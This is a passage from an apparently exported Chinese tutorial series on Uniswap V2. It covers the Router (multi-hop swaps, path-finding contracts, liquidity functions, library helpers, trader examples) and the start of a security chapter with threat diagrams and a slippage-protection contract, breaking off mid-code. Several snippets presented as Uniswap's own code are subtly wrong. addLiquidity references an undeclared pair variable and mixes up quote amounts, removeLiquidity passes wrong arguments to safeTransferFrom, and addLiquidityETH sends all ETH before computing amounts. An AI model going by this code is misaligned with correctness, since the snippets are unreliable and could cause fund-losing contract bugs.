amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external returns (uint256[] memory amounts) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n    require(path[path.length - 1] == WETH, &quot;UniswapV2Router: INVALID_PATH&quot;);\n \n    amounts = getAmountsOut(amountIn, path);\n    require(\n        amounts[amounts.length - 1] &gt;= amountOutMin,\n        &quot;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&quot;\n    );\n \n    _safeSwap(amounts, path, address(this));\n \n    // 将WETH解包为ETH\n    IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n    TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n}\n\n3. 多跳交易机制\n3.1 多跳交易流程\nsequenceDiagram\n    participant U as User\n    participant R as Router\n    participant P1 as Pair USDC/DAI\n    participant P2 as Pair DAI/USDT\n    participant P3 as Pair USDT/WETH\n\n    U-&gt;&gt;R: swapExactTokensForTokens(1000 USDC, [USDC, DAI, USDT, WETH])\n    R-&gt;&gt;R: getAmountsOut() 计算各步输出\n\n    Note over R: amounts = [1000, 998, 997, 0.5]\n\n    R-&gt;&gt;U: transferFrom(1000 USDC)\n    R-&gt;&gt;P1: swap(0, 998 DAI, P2, data)\n    P1-&gt;&gt;P2: transfer(998 DAI)\n\n    P2-&gt;&gt;P2: swap(0, 997 USDT, P3, data)\n    P2-&gt;&gt;P3: transfer(997 USDT)\n\n    P3-&gt;&gt;P3: swap(0, 0.5 WETH, user, data)\n    P3-&gt;&gt;U: transfer(0.5 WETH)\n\n3.2 _swap内部函数\nfunction _swap(\n    uint256[] memory amounts,\n    address[] memory path,\n    address _to\n) internal virtual {\n    for (uint256 i; i &lt; path.length - 1; i++) {\n        (address input, address output) = (path[i], path[i + 1]);\n \n        // 确定token0和token1顺序\n        (address token0, ) = UniswapV2Library.sortTokens(input, output);\n        uint256 amountOut = amounts[i + 1];\n \n        // 确定输出地址：最后一跳输出给用户，中间跳输出给下一个Pair\n        (uint256 amount0Out, uint256 amount1Out) = input == token0\n            ? (uint256(0), amountOut)\n            : (amountOut, uint256(0));\n \n        // 确定接收地址\n        address to = i &lt; path.length - 2\n            ? UniswapV2Library.pairFor(factory, output, path[i + 2])\n            : _to;\n \n        // 获取Pair地址并执行swap\n        IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n            amount0Out,\n            amount1Out,\n            to,\n            new bytes(0)\n        );\n    }\n}\n \nfunction _safeSwap(\n    uint256[] memory amounts,\n    address[] memory path,\n    address _to\n) internal virtual {\n    // 先转入代币到第一个Pair\n    IERC20(path[0]).safeTransferFrom(\n        msg.sender,\n        UniswapV2Library.pairFor(factory, path[0], path[1]),\n        amounts[0]\n    );\n \n    _swap(amounts, path, _to);\n}\n3.3 getAmountsOut函数\nfunction getAmountsOut(\n    uint256 amountIn,\n    address[] memory path\n) public view returns (uint256[] memory amounts) {\n    require(path.length &gt;= 2, &quot;UniswapV2Library: INVALID_PATH&quot;);\n \n    amounts = new uint256[](path.length);\n    amounts[0] = amountIn;\n \n    for (uint256 i; i &lt; path.length - 1; i++) {\n        // 获取Pair储备量\n        (uint256 reserveIn, uint256 reserveOut) = UniswapV2Library.getReserves(\n            factory,\n            path[i],\n            path[i + 1]\n        );\n \n        // 计算输出\n        amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n    }\n}\n3.4 getAmountsIn函数\nfunction getAmountsIn(\n    uint256 amountOut,\n    address[] memory path\n) public view returns (uint256[] memory amounts) {\n    require(path.length &gt;= 2, &quot;UniswapV2Library: INVALID_PATH&quot;);\n \n    amounts = new uint256[](path.length);\n    amounts[amounts.length - 1] = amountOut;\n \n    for (uint256 i = path.length - 1; i &gt; 0; i--) {\n        (uint256 reserveIn, uint256 reserveOut) = UniswapV2Library.getReserves(\n            factory,\n            path[i - 1],\n            path[i]\n        );\n \n        amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n    }\n}\n\n4. 路径查找算法\n4.1 路径搜索问题\ngraph TB\n    subgraph Graph[\\&quot;交易路径图\\&quot;]\n        USDC[USDC]\n        DAI[DAI]\n        USDT[USDT]\n        WETH[WETH]\n        WBTC[WBTC]\n\n        USDC --&gt; DAI\n        USDC --&gt; USDT\n        USDC --&gt; WETH\n        DAI --&gt; USDT\n        DAI --&gt; WETH\n        USDT --&gt; WETH\n        WETH --&gt; WBTC\n    end\n\n    subgraph Paths[\\&quot;USDC → WBTC 可能路径\\&quot;]\n        P1[\\&quot;USDC → WETH → WBTC&lt;br/&gt;2跳\\&quot;]\n        P2[\\&quot;USDC → DAI → WETH → WBTC&lt;br/&gt;3跳\\&quot;]\n        P3[\\&quot;USDC → USDT → WETH → WBTC&lt;br/&gt;3跳\\&quot;]\n    end\n\n    Graph --&gt; Paths\n\n    style P1 fill:#c8e6c9\n\n4.2 简单路径查找\ncontract PathFinder {\n    address public immutable factory;\n \n    struct Route {\n        address[] path;\n        uint256 amountOut;\n    }\n \n    constructor(address _factory) {\n        factory = _factory;\n    }\n \n    /// @notice 查找最佳路径（简化版）\n    function findBestPath(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) external view returns (address[] memory bestPath, uint256 bestAmount) {\n        // 1. 尝试直接交易对\n        address directPair = IUniswapV2Factory(factory).getPair(tokenIn, tokenOut);\n        if (directPair != address(0)) {\n            (uint256 reserveIn, uint256 reserveOut, ) = IUniswapV2Pair(directPair).getReserves();\n            if (reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0) {\n                bestPath = new address[](2);\n                bestPath[0] = tokenIn;\n                bestPath[1] = tokenOut;\n                bestAmount = getAmountOut(amountIn, reserveIn, reserveOut);\n            }\n        }\n \n        // 2. 尝试通过WETH中转\n        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Mainnet WETH\n \n        if (tokenIn != weth &amp;&amp; tokenOut != weth) {\n            uint256 amountViaWeth = getAmountViaWeth(tokenIn, tokenOut, amountIn);\n \n            if (amountViaWeth &gt; bestAmount) {\n                bestPath = new address[](3);\n                bestPath[0] = tokenIn;\n                bestPath[1] = weth;\n                bestPath[2] = tokenOut;\n                bestAmount = amountViaWeth;\n            }\n        }\n \n        return (bestPath, bestAmount);\n    }\n \n    /// @notice 通过WETH中转计算输出\n    function getAmountViaWeth(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) internal view returns (uint256 amountOut) {\n        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n \n        // 第一步: tokenIn -&gt; WETH\n        address pair1 = IUniswapV2Factory(factory).getPair(tokenIn, weth);\n        if (pair1 == address(0)) return 0;\n \n        (uint256 reserveIn1, uint256 reserveOut1, ) = IUniswapV2Pair(pair1).getReserves();\n        // 确定储备顺序\n        if (IERC20(tokenIn) &gt; IERC20(weth)) {\n            (reserveIn1, reserveOut1) = (reserveOut1, reserveIn1);\n        }\n        uint256 amountWeth = getAmountOut(amountIn, reserveIn1, reserveOut1);\n \n        // 第二步: WETH -&gt; tokenOut\n        address pair2 = IUniswapV2Factory(factory).getPair(weth, tokenOut);\n        if (pair2 == address(0)) return 0;\n \n        (uint256 reserveIn2, uint256 reserveOut2, ) = IUniswapV2Pair(pair2).getReserves();\n        if (IERC20(weth) &gt; IERC20(tokenOut)) {\n            (reserveIn2, reserveOut2) = (reserveOut2, reserveIn2);\n        }\n        amountOut = getAmountOut(amountWeth, reserveIn2, reserveOut2);\n    }\n \n    function getAmountOut(\n        uint256 amountIn,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) internal pure returns (uint256) {\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = reserveIn * 1000 + amountInWithFee;\n        return numerator / denominator;\n    }\n}\n4.3 广度优先搜索\ncontract BFSPathFinder {\n    address public immutable factory;\n    address public immutable weth;\n \n    uint256 public constant MAX_HOPS = 3;\n \n    constructor(address _factory, address _weth) {\n        factory = _factory;\n        weth = _weth;\n    }\n \n    /// @notice BFS查找最佳路径\n    function findBestPathBFS(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn,\n        address[] memory baseTokens\n    ) external view returns (address[] memory bestPath, uint256 bestAmount) {\n        bestAmount = 0;\n \n        // 尝试直接路径\n        (bestPath, bestAmount) = _tryDirectPath(tokenIn, tokenOut, amountIn);\n \n        // 尝试通过baseToken中转\n        for (uint256 i = 0; i &lt; baseTokens.length; i++) {\n            address base = baseTokens[i];\n \n            // 避免无效路径\n            if (base == tokenIn || base == tokenOut) continue;\n \n            (address[] memory path, uint256 amount) = _tryTwoHopPath(\n                tokenIn,\n                base,\n                tokenOut,\n                amountIn\n            );\n \n            if (amount &gt; bestAmount) {\n                bestPath = path;\n                bestAmount = amount;\n            }\n        }\n \n        return (bestPath, bestAmount);\n    }\n \n    function _tryDirectPath(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) internal view returns (address[] memory path, uint256 amount) {\n        address pair = IUniswapV2Factory(factory).getPair(tokenIn, tokenOut);\n        if (pair == address(0)) return (new address[](0), 0);\n \n        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();\n        if (reserve0 == 0 || reserve1 == 0) return (new address[](0), 0);\n \n        path = new address[](2);\n        path[0] = tokenIn;\n        path[1] = tokenOut;\n \n        (uint256 reserveIn, uint256 reserveOut) = tokenIn &lt; tokenOut\n            ? (reserve0, reserve1)\n            : (reserve1, reserve0);\n \n        amount = _getAmountOut(amountIn, reserveIn, reserveOut);\n    }\n \n    function _tryTwoHopPath(\n        address tokenIn,\n        address midToken,\n        address tokenOut,\n        uint256 amountIn\n    ) internal view returns (address[] memory path, uint256 amount) {\n        // 第一段: tokenIn -&gt; midToken\n        address pair1 = IUniswapV2Factory(factory).getPair(tokenIn, midToken);\n        if (pair1 == address(0)) return (new address[](0), 0);\n \n        (uint112 reserve0a, uint112 reserve1a, ) = IUniswapV2Pair(pair1).getReserves();\n        if (reserve0a == 0 || reserve1a == 0) return (new address[](0), 0);\n \n        (uint256 reserveIn1, uint256 reserveOut1) = tokenIn &lt; midToken\n            ? (reserve0a, reserve1a)\n            : (reserve1a, reserve0a);\n \n        uint256 midAmount = _getAmountOut(amountIn, reserveIn1, reserveOut1);\n        if (midAmount == 0) return (new address[](0), 0);\n \n        // 第二段: midToken -&gt; tokenOut\n        address pair2 = IUniswapV2Factory(factory).getPair(midToken, tokenOut);\n        if (pair2 == address(0)) return (new address[](0), 0);\n \n        (uint112 reserve0b, uint112 reserve1b, ) = IUniswapV2Pair(pair2).getReserves();\n        if (reserve0b == 0 || reserve1b == 0) return (new address[](0), 0);\n \n        (uint256 reserveIn2, uint256 reserveOut2) = midToken &lt; tokenOut\n            ? (reserve0b, reserve1b)\n            : (reserve1b, reserve0b);\n \n        amount = _getAmountOut(midAmount, reserveIn2, reserveOut2);\n \n        path = new address[](3);\n        path[0] = tokenIn;\n        path[1] = midToken;\n        path[2] = tokenOut;\n    }\n \n    function _getAmountOut(\n        uint256 amountIn,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) internal pure returns (uint256) {\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = reserveIn * 1000 + amountInWithFee;\n        return numerator / denominator;\n    }\n}\n\n5. 流动性管理功能\n5.1 addLiquidity\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n) external returns (uint256 amountA, uint256 amountB, uint256 liquidity) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n \n    // 1. 确保token顺序\n    (tokenA, tokenB) = UniswapV2Library.sortTokens(tokenA, tokenB);\n \n    // 2. 获取Pair储备量\n    (uint256 reserveA, uint256 reserveB) = UniswapV2Library.getReserves(\n        factory,\n        tokenA,\n        tokenB\n    );\n \n    // 3. 如果Pair不存在，创建\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    }\n \n    // 4. 计算最优添加数量（按比例）\n    uint256 amountAOptimal = UniswapV2Library.quote(\n        amountADesired,\n        reserveA,\n        reserveB\n    );\n \n    if (amountAOptimal &lt;= amountADesired) {\n        require(\n            amountAOptimal &gt;= amountAMin,\n            &quot;UniswapV2Router: INSUFFICIENT_A_AMOUNT&quot;\n        );\n        (amountA, amountB) = (amountAOptimal, amountBDesired);\n    } else {\n        uint256 amountBOptimal = UniswapV2Library.quote(\n            amountBDesired,\n            reserveB,\n            reserveA\n        );\n        require(\n            amountBOptimal &gt;= amountBMin,\n            &quot;UniswapV2Router: INSUFFICIENT_B_AMOUNT&quot;\n        );\n        (amountA, amountB) = (amountADesired, amountBOptimal);\n    }\n \n    // 5. 转入代币\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n \n    // 6. 调用Pair的mint\n    liquidity = IUniswapV2Pair(pair).mint(to);\n}\n5.2 addLiquidityETH\nfunction addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n \n    // 1. 包装ETH为WETH\n    IWETH(WETH).deposit{value: msg.value}();\n    assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, token, WETH), msg.value));\n \n    // 2. 获取储备量\n    (uint256 reserveToken, uint256 reserveETH) = UniswapV2Library.getReserves(\n        factory,\n        token,\n        WETH\n    );\n \n    // 3. 计算最优token数量\n    uint256 amountTokenOptimal = UniswapV2Library.quote(\n        msg.value,\n        reserveETH,\n        reserveToken\n    );\n \n    if (amountTokenOptimal &lt;= amountTokenDesired) {\n        require(\n            amountTokenOptimal &gt;= amountTokenMin,\n            &quot;UniswapV2Router: INSUFFICIENT_TOKEN_AMOUNT&quot;\n        );\n        (amountToken, amountETH) = (amountTokenOptimal, msg.value);\n    } else {\n        uint256 amountETHOptimal = UniswapV2Library.quote(\n            amountTokenDesired,\n            reserveToken,\n            reserveETH\n        );\n        require(\n            amountETHOptimal &gt;= amountETHMin,\n            &quot;UniswapV2Router: INSUFFICIENT_ETH_AMOUNT&quot;\n        );\n        (amountToken, amountETH) = (amountTokenDesired, amountETHOptimal);\n \n        // 退还多余ETH\n        IWETH(WETH).withdraw(msg.value - amountETHOptimal);\n        TransferHelper.safeTransferETH(msg.sender, msg.value - amountETHOptimal);\n    }\n \n    // 4. 转入token\n    TransferHelper.safeTransferFrom(\n        token,\n        msg.sender,\n        UniswapV2Library.pairFor(factory, token, WETH),\n        amountToken\n    );\n \n    // 5. Mint LP代币\n    liquidity = IUniswapV2Pair(UniswapV2Library.pairFor(factory, token, WETH)).mint(to);\n \n    // 退还剩余WETH（如果有）\n    if (msg.value &gt; amountETH) {\n        IWETH(WETH).withdraw(msg.value - amountETH);\n        TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    }\n}\n5.3 removeLiquidity\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n) public returns (uint256 amountA, uint256 amountB) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n \n    // 1. 获取Pair地址\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n \n    // 2. 授权Router\n    IUniswapV2Pair(pair).approve(address(this), liquidity);\n \n    // 3. 转入LP代币\n    TransferHelper.safeTransferFrom(\n        msg.sender,\n        pair,\n        pair, // 转入Pair合约\n        liquidity\n    );\n \n    // 4. 调用Pair的burn\n    (uint256 amount0, uint256 amount1) = IUniswapV2Pair(pair).burn(to);\n \n    // 5. 确定tokenA和tokenB对应的amount\n    (amountA, amountB) = tokenA &lt; tokenB\n        ? (amount0, amount1)\n        : (amount1, amount0);\n \n    // 6. 验证最小输出\n    require(amountA &gt;= amountAMin, &quot;UniswapV2Router: INSUFFICIENT_A_AMOUNT&quot;);\n    require(amountB &gt;= amountBMin, &quot;UniswapV2Router: INSUFFICIENT_B_AMOUNT&quot;);\n}\n\n6. UniswapV2Library工具函数\n6.1 sortTokens\nlibrary UniswapV2Library {\n    /// @notice 排序两个token地址\n    function sortTokens(address tokenA, address tokenB)\n        internal\n        pure\n        returns (address token0, address token1)\n    {\n        require(tokenA != tokenB, &quot;UniswapV2Library: IDENTICAL_ADDRESSES&quot;);\n        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), &quot;UniswapV2Library: ZERO_ADDRESS&quot;);\n    }\n}\n6.2 pairFor\n/// @notice 计算Pair地址（确定性计算）\nfunction pairFor(\n    address factory,\n    address tokenA,\n    address tokenB\n) internal pure returns (address pair) {\n    (address token0, address token1) = sortTokens(tokenA, tokenB);\n    pair = address(\n        uint160(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        hex&quot;ff&quot;,\n                        factory,\n                        keccak256(abi.encodePacked(token0, token1)),\n                        hex&quot;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&quot; // init code hash\n                    )\n                )\n            )\n        )\n    );\n}\n6.3 getReserves\n/// @notice 获取Pair储备量\nfunction getReserves(\n    address factory,\n    address tokenA,\n    address tokenB\n) internal view returns (uint256 reserveA, uint256 reserveB) {\n    (address token0, ) = sortTokens(tokenA, tokenB);\n    (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n    (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n}\n6.4 quote\n/// @notice 按比例计算数量\nfunction quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n) internal pure returns (uint256 amountB) {\n    require(amountA &gt; 0, &quot;UniswapV2Library: INSUFFICIENT_AMOUNT&quot;);\n    require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &quot;UniswapV2Library: INSUFFICIENT_LIQUIDITY&quot;);\n    amountB = (amountA * reserveB) / reserveA;\n}\n\n7. Router使用示例\n7.1 完整交易合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&quot;;\nimport &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;\n \ncontract UniswapTrader {\n    IUniswapV2Router02 public immutable router;\n    address public immutable weth;\n \n    event Swapped(\n        address indexed tokenIn,\n        address indexed tokenOut,\n        uint256 amountIn,\n        uint256 amountOut,\n        address indexed recipient\n    );\n \n    constructor(address _router) {\n        router = IUniswapV2Router02(_router);\n        weth = router.WETH();\n    }\n \n    /// @notice 精确输入交易\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address recipient\n    ) external returns (uint256 amountOut) {\n        // 授权Router\n        IERC20(path[0]).approve(address(router), amountIn);\n \n        // 转入代币\n        IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\n \n        // 执行交易\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            recipient,\n            block.timestamp\n        );\n \n        amountOut = amounts[amounts.length - 1];\n \n        emit Swapped(path[0], path[path.length - 1], amountIn, amountOut, recipient);\n    }\n \n    /// @notice ETH交易\n    function swapExactETHForTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address recipient\n    ) external payable returns (uint256 amountOut) {\n        require(path[0] == weth, &quot;Invalid path&quot;);\n \n        uint256[] memory amounts = router.swapExactETHForTokens{value: msg.value}(\n            amountOutMin,\n            path,\n            recipient,\n            block.timestamp\n        );\n \n        amountOut = amounts[amounts.length - 1];\n        emit Swapped(weth, path[path.length - 1], msg.value, amountOut, recipient);\n    }\n \n    /// @notice 代币换ETH\n    function swapExactTokensForETH(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address recipient\n    ) external returns (uint256 amountOut) {\n        require(path[path.length - 1] == weth, &quot;Invalid path&quot;);\n \n        IERC20(path[0]).approve(address(router), amountIn);\n        IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\n \n        uint256[] memory amounts = router.swapExactTokensForETH(\n            amountIn,\n            amountOutMin,\n            path,\n            recipient,\n            block.timestamp\n        );\n \n        amountOut = amounts[amounts.length - 1];\n        emit Swapped(path[0], weth, amountIn, amountOut, recipient);\n    }\n \n    /// @notice 查询输出数量\n    function getAmountsOut(\n        uint256 amountIn,\n        address[] calldata path\n    ) external view returns (uint256[] memory) {\n        return router.getAmountsOut(amountIn, path);\n    }\n \n    // 接收ETH\n    receive() external payable {}\n}\n7.2 最佳路径查找器\ncontract BestPathFinder {\n    IUniswapV2Router02 public immutable router;\n    address public immutable factory;\n \n    address[] public baseTokens;\n \n    event BestPathFound(\n        address indexed tokenIn,\n        address indexed tokenOut,\n        address[] path,\n        uint256 amountOut\n    );\n \n    constructor(address _router, address[] memory _baseTokens) {\n        router = IUniswapV2Router02(_router);\n        factory = router.factory();\n        baseTokens = _baseTokens;\n    }\n \n    /// @notice 查找最佳路径并执行交易\n    function findBestPathAndSwap(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address tokenIn,\n        address tokenOut,\n        address recipient\n    ) external returns (uint256 amountOut) {\n        (address[] memory bestPath, uint256 bestAmount) = _findBestPath(\n            tokenIn,\n            tokenOut,\n            amountIn\n        );\n \n        require(bestPath.length &gt; 0, &quot;No valid path found&quot;);\n        require(bestAmount &gt;= amountOutMin, &quot;Insufficient output amount&quot;);\n \n        // 授权并转入代币\n        IERC20(tokenIn).approve(address(router), amountIn);\n        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);\n \n        // 执行交易\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            bestPath,\n            recipient,\n            block.timestamp\n        );\n \n        amountOut = amounts[amounts.length - 1];\n \n        emit BestPathFound(tokenIn, tokenOut, bestPath, amountOut);\n    }\n \n    /// @notice 查找最佳路径\n    function _findBestPath(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) internal view returns (address[] memory bestPath, uint256 bestAmount) {\n        // 尝试直接路径\n        address directPair = IUniswapV2Factory(factory).getPair(tokenIn, tokenOut);\n        if (directPair != address(0)) {\n            bestPath = new address[](2);\n            bestPath[0] = tokenIn;\n            bestPath[1] = tokenOut;\n \n            uint256[] memory amounts = router.getAmountsOut(amountIn, bestPath);\n            bestAmount = amounts[1];\n        }\n \n        // 尝试通过baseToken中转\n        for (uint256 i = 0; i &lt; baseTokens.length; i++) {\n            address base = baseTokens[i];\n            if (base == tokenIn || base == tokenOut) continue;\n \n            address[] memory path = new address[](3);\n            path[0] = tokenIn;\n            path[1] = base;\n            path[2] = tokenOut;\n \n            // 检查两个Pair是否都存在\n            if (IUniswapV2Factory(factory).getPair(tokenIn, base) == address(0)) continue;\n            if (IUniswapV2Factory(factory).getPair(base, tokenOut) == address(0)) continue;\n \n            uint256[] memory amounts = router.getAmountsOut(amountIn, path);\n \n            if (amounts[2] &gt; bestAmount) {\n                bestPath = path;\n                bestAmount = amounts[2];\n            }\n        }\n    }\n}\n\n8. 本章小结\n8.1 Router总结\nmindmap\n  root((Router与路由))\n    Router功能\n      封装Pair交互\n      多跳交易\n      WETH处理\n      流动性管理\n    核心函数\n      swapExactTokensForTokens\n      swapTokensForExactTokens\n      addLiquidity\n      removeLiquidity\n    路径查找\n      直接路径\n      单跳中转\n      多跳路径\n      最佳路径\n    Library工具\n      sortTokens\n      pairFor\n      getReserves\n      quote\n\n8.2 关键函数回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能特点swapExactTokensForTokens()精确输入指定输入、最小输出swapTokensForExactTokens()精确输出指定输出、最大输入getAmountsOut()查询输出计算路径输出addLiquidity()添加流动性按比例添加removeLiquidity()移除流动性销毁LP赎回\n\n下一篇预告\n在下一篇文章中，我们将深入探讨安全实践与最佳实践，包括：\n\n常见安全漏洞\n滑点保护策略\nMEV防护\n审计检查清单\n\n\n参考资料\n\nUniswap V2 Periphery - UniswapV2Router02.sol\nUniswap V2 Periphery - UniswapV2Library.sol\nRouter Integration Guide\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/07-安全实践与最佳实践":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/07-安全实践与最佳实践","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/07-安全实践与最佳实践.md","title":"07-安全实践与最佳实践","links":[],"tags":[],"content":"死磕Uniswap V2（七）：安全实践与最佳实践\n\n本文是「死磕Uniswap V2」系列的第七篇，全面总结V2开发中的安全实践与最佳实践。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. 安全威胁概览\n1.1 常见攻击类型\nmindmap\n  root((V2安全威胁))\n    价格操纵\n      闪电贷攻击\n      三明治攻击\n      洗盘交易\n    重入攻击\n      swap重入\n      callback重入\n    滑点攻击\n      前端交易\n      抢跑交易\n    预言机攻击\n      TWAP操纵\n      短期操纵\n    授权风险\n      无限授权\n      恶意合约\n\n1.2 攻击影响\ngraph TB\n    subgraph Attacks[\\&quot;攻击类型\\&quot;]\n        A1[\\&quot;价格操纵\\&quot;]\n        A2[\\&quot;MEV攻击\\&quot;]\n        A3[\\&quot;重入攻击\\&quot;]\n        A4[\\&quot;授权盗用\\&quot;]\n    end\n\n    subgraph Impact[\\&quot;潜在影响\\&quot;]\n        I1[\\&quot;资金损失\\&quot;]\n        I2[\\&quot;价格偏离\\&quot;]\n        I3[\\&quot;套利流失\\&quot;]\n        I4[\\&quot;用户信任下降\\&quot;]\n    end\n\n    Attacks --&gt; Impact\n\n    style I1 fill:#ffcdd2\n    style I4 fill:#ffcdd2\n\n\n2. 滑点保护\n2.1 滑点攻击原理\nsequenceDiagram\n    participant M as 矿工/攻击者\n    participant U as 用户\n    participant P as Pair合约\n    participant Mempool as 内存池\n\n    U-&gt;&gt;Mempool: 提交交易: swap(1000 ETH, amountOutMin=1900 USDC)\n    M-&gt;&gt;Mempool: 监测到高价值交易\n\n    Note over M: 在用户交易之前插入交易\n\n    M-&gt;&gt;P: 抢跑交易: swap(100 ETH, 195 USDC)\n    P-&gt;&gt;M: 价格滑点\n\n    M-&gt;&gt;Mempool: 用户交易执行\n    Note over U: 用户获得更差的价格\n\n    M-&gt;&gt;P: 回跑交易: swap(195 USDC, 99 ETH)\n    M-&gt;&gt;M: 获得约4 ETH利润\n\n2.2 滑点保护实现\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&quot;;\n \ncontract SlippageProtectedTrader {\n    IUniswapV2Router02 public immutable router;\n \n    struct SwapParams {\n        uint256 amountIn;\n        uint256 slippageTolerance; // 基点，如 300 = 3%\n        address[] path;\n        address recipient;\n    }\n \n    event SwapExecuted(\n        address indexed tokenIn,\n        address indexed tokenOut,\n        uint256 amountIn,\n        uint256 amountOut,\n        uint256 slippage\n    );\n \n    constructor(address _router) {\n        router = IUniswapV2Router02(_router);\n    }\n \n    /// @notice 带滑点保护的交换\n    function swapWithProtection(SwapParams calldata params)\n        external\n        returns (uint256 amountOut)\n    {\n        // 1. 查询预期输出\n        uint256[] memory expectedAmounts = router.getAmountsOut(\n            params.amountIn,\n            params.path\n        );\n \n        uint256 expectedAmountOut = expectedAmounts[expectedAmounts.length - 1];\n \n        // 2. 计算最小输出\n        uint256 amountOutMin = (expectedAmountOut * (10000 - params.slippageTolerance)) / 10000;\n \n        // 3. 验证滑点设置合理\n        require(\n            params.slippageTolerance &lt;= 1000, // 最多10%\n            &quot;Slippage too high&quot;\n        );\n \n        require(\n            params.slippageTolerance &gt;= 10, // 最少0.1%\n            &quot;Slippage too low&quot;\n        );\n \n        // 4. 授权Router\n        IERC20(params.path[0]).approve(address(router), params.amountIn);\n \n        // 5. 执行交易\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            params.amountIn,\n            amountOutMin,\n            params.path,\n            params.recipient,\n            block.timestamp\n        );\n \n        amountOut = amounts[amounts.length - 1];\n \n        // 6. 计算实际滑点\n        uint256 actualSlippage = expectedAmountOut &gt; amountOut\n            ? ((expectedAmountOut - amountOut) * 10000) / expectedAmountOut\n            : 0;\n \n        emit SwapExecuted(\n            params.path[0],\n            params.path[params.path.length - 1],\n            params.amountIn,\n            amountOut,\n            actualSlippage\n        );\n    }\n \n    /// @notice 批量交易带滑点保护\n    function batchSwapWithProtection(\n        SwapParams[] calldata paramsList\n    ) external returns (uint256[] memory amountsOut) {\n        amountsOut = new uint256[](paramsList.length);\n \n        for (uint256 i = 0; i &lt; 